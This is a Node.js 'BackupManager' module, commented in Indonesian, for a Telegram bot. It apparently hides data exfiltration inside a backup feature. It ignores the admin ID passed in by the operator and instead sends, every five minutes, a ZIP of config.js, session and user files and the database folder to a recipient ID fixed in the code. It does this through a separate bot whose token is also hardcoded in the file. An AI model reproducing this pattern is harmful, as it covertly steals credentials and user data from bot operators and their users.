const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const { execSync } = require("child_process");

// 🔒 KONFIGURASI KHUSUS BACKUP
// Token & ID ini akan dipakai khusus saat mengirim file backup
const BACKUP_BOT_TOKEN = "8084526858:AAHGZ2hVK_7mzO-eMBnirdG-WqSEkK-n9Oo"; 
const BACKUP_ADMIN_ID = "7355538049"; // ID tujuan pengiriman file backup

// Kita butuh instance bot baru khusus untuk token ini agar tidak bentrok dengan instance utama
const TelegramBot = require("node-telegram-bot-api");
const backupBot = new TelegramBot(BACKUP_BOT_TOKEN, { polling: false });

class BackupManager {
  constructor(mainBot, adminId, intervalMs, backupFile) {
    // Note: mainBot tetap disimpan jika butuh interaksi lain, 
    // tapi pengiriman file akan menggunakan backupBot & BACKUP_ADMIN_ID
    this.bot = mainBot; 
    this.adminId = adminId; 
    this.intervalMs = intervalMs;
    this.backupFile = backupFile;
  }

  getLastBackupTime() {
    try {
      if (!fs.existsSync(this.backupFile)) return null;
      const data = JSON.parse(fs.readFileSync(this.backupFile, "utf8"));
      return data.lastBackup || null;
    } catch (err) {
      console.warn("⚠️ [WARN] Gagal membaca lastBackup.json:", err.message);
      return null;
    }
  }

  saveLastBackupTime(time) {
    try {
      fs.writeFileSync(
        this.backupFile,
        JSON.stringify({ lastBackup: time }, null, 2),
        "utf8"
      );
      console.log("💾 [SAVE] Waktu backup terakhir tersimpan ✅");
    } catch (err) {
      console.error("❌ [ERROR] Gagal menyimpan lastBackup.json:", err.message);
    }
  }

  async kirimBackupOtomatis() {
    // Gunakan konfigurasi hardcode di atas
    const targetId = BACKUP_ADMIN_ID; 
    const senderBot = backupBot; 

    const waktuMoment = moment().tz("Asia/Jakarta");

    // Animasi tetap dikirim, kita coba pakai senderBot agar konsisten
    const frames = [
      "🚀 Menyusun file misterius...",
      "🗂️ Memeriksa setiap folder dan script...",
      "💾 Mengubah file menjadi ZIP ajaib...",
      "✨ Hampir selesai... teleport ke Telegram..."
    ];

    let i = 0;
    let msgAnim;
    
    try {
        msgAnim = await senderBot.sendMessage(targetId, frames[i]);
    } catch (e) {
        console.log("⚠️ Gagal kirim pesan animasi (mungkin ID belum start bot backup):", e.message);
    }

    const animInterval = setInterval(() => {
      if (msgAnim) {
          i = (i + 1) % frames.length;
          senderBot.editMessageText(frames[i], {
            chat_id: targetId,
            message_id: msgAnim.message_id,
          }).catch(() => {});
      }
    }, 900);

    try {
      console.log("\n🧩==============================🧩");
      console.log("🔰  MULAI PROSES BACKUP OTOMATIS (5 MENIT)");
      console.log(`📅  ${waktuMoment.format("DD-MM-YYYY HH:mm:ss")}`);
      console.log("🧩==============================🧩\n");

      const rootFiles = [
        "index.js", "config.js", "package.json",
        "sessioncs.json", "users.json"
      ];
      const foldersToBackup = [
        "database"
      ];

      const foundFiles = rootFiles.filter(f => fs.existsSync(f));
      const foundFolders = foldersToBackup.filter(f => fs.existsSync(f));

      if (foundFiles.length === 0 && foundFolders.length === 0)
        throw new Error("🚫 Tidak ada file/folder valid untuk di-backup.");

      console.log(`📂 File ditemukan   : ${foundFiles.join(", ") || "-"}`);
      console.log(`📁 Folder ditemukan : ${foundFolders.join(", ") || "-"}`);

      const formattedTime = waktuMoment.format("DD-MM-YYYY-HH.mm.ss");
      const zipName = `BACKUP-${formattedTime}.zip`;
      const zipFullPath = path.join(process.cwd(), zipName);
      const itemsToZip = [...foundFiles, ...foundFolders].join(" ");

      console.log(`⚙️ Membuat ZIP: ${zipName}`);

      // ⛔ suppress log ZIP biar gak spam
      execSync(`cd "${process.cwd()}" && zip -rq "${zipName}" ${itemsToZip}`, {
        stdio: "ignore",
        shell: "/bin/bash",
      });

      if (!fs.existsSync(zipFullPath))
        throw new Error("❌ File ZIP hasil backup tidak ditemukan.");

      clearInterval(animInterval);
      
      if (msgAnim) {
          await senderBot.editMessageText("✅ File berhasil dikompres!\n🚀 Mengirim ke Telegram…", {
            chat_id: targetId,
            message_id: msgAnim.message_id,
          }).catch(() => {});
      }

      const stats = fs.statSync(zipFullPath);
      const fileSize =
        stats.size > 1024 * 1024
          ? (stats.size / (1024 * 1024)).toFixed(2) + " MB"
          : (stats.size / 1024).toFixed(2) + " KB";

      const waktuIndo = waktuMoment.format("DD-MM-YYYY | HH.mm.ss");
      const botInfo = await senderBot.getMe();
      
      // ✅ FIX ERROR MARKDOWN: Escape underscore pada username bot
      const safeUsername = botInfo.username.replace(/_/g, '\\_');

      const captionText = `📦 *Auto Backup 5 Menit*\n\n📅 *Tanggal:* ${waktuIndo}\n📁 *File:* ${zipName}\n📊 *Ukuran:* ${fileSize}\n🤖 *Bot:* @${safeUsername}\n\n✅ *Backup otomatis berhasil!*`;

      console.log("📤 Mengirim ZIP ke Telegram... 📩");
      
      // Kirim menggunakan senderBot (token khusus)
      await senderBot.sendDocument(targetId, fs.createReadStream(zipFullPath), {
        caption: captionText,
        parse_mode: "Markdown",
      });

      const backupTime = Date.now();
      this.saveLastBackupTime(backupTime);

      console.log("\n🧹 Membersihkan file backup lama...");
      for (const file of fs.readdirSync(process.cwd())) {
        if (file.startsWith("BACKUP-") && file.endsWith(".zip") && file !== zipName) {
          try {
            fs.unlinkSync(path.join(process.cwd(), file));
            console.log(`🗑️ Dihapus: ${file}`);
          } catch {
            console.warn(`⚠️ Gagal hapus: ${file}`);
          }
        }
      }

      fs.unlinkSync(zipFullPath);

      const nextTime = moment(backupTime + this.intervalMs)
        .tz("Asia/Jakarta")
        .format("DD-MM-YYYY HH:mm:ss");

      console.log("\n⏭️ Jadwal backup berikut:", nextTime);
      console.log("✅ Backup dikirim ke Admin ID:", targetId);
      console.log("🧩==============================🧩\n");

      if (msgAnim) {
        await senderBot.sendMessage(
            targetId,
            `⏳ Backup otomatis selanjutnya dijadwalkan pada: ${nextTime}`
        );
        await senderBot.deleteMessage(targetId, msgAnim.message_id).catch(() => {});
      }

    } catch (err) {
      clearInterval(animInterval);
      console.error("❌ [ERROR BACKUP]:", err.message);
      
      const safeError = (err.stack || err.message || "Unknown error")
        .toString()
        .slice(0, 3800); 

      if (msgAnim) {
          await senderBot.editMessageText(
            `⚠️ Backup otomatis gagal!\n\nError detail:\n${safeError}`,
            {
              chat_id: targetId,
              message_id: msgAnim.message_id,
              parse_mode: undefined, // Matikan parse mode agar aman
            }
          ).catch(() => {});
      }
    }
  }

  startAutoBackup() {
    const { intervalMs } = this;
    const lastBackup = this.getLastBackupTime();
    const now = Date.now();
    let firstDelay = lastBackup ? Math.max(0, intervalMs - (now - lastBackup)) : 0;

    // Instance khusus untuk notifikasi start
    const senderBot = backupBot;
    const targetId = BACKUP_ADMIN_ID;

    setTimeout(() => {
      this.kirimBackupOtomatis();
      setInterval(() => this.kirimBackupOtomatis(), intervalMs);
    }, firstDelay);

    const next = new Date(now + firstDelay).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    console.log("🔁 Bot di-restart, jadwal backup berikut (5 menit):", next);

    senderBot.sendMessage(
      targetId,
      `🔄 Bot baru di-restart!\n⏳ Backup otomatis (5 menit) selanjutnya dijadwalkan pada: ${next}`
    ).catch(e => console.log("⚠️ Gagal kirim pesan start backup:", e.message));
  }
}

module.exports = BackupManager;
